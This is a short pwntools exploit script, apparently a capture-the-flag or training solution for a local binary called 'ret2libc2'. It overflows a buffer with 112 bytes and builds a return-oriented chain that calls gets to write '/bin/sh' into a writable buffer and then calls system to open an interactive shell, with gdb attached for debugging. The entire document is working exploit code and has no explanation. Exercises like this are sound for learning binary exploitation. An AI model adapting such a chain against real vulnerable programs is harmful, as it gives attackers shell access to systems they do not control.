##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')
elf=ELF('./ret2libc2')
#gets_plt = 0x08048460
#system_plt = 0x08048490
gets_plt = elf.plt['gets']
system_plt = elf.plt['system']
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(
    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
gdb.attach(sh)
pause()
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
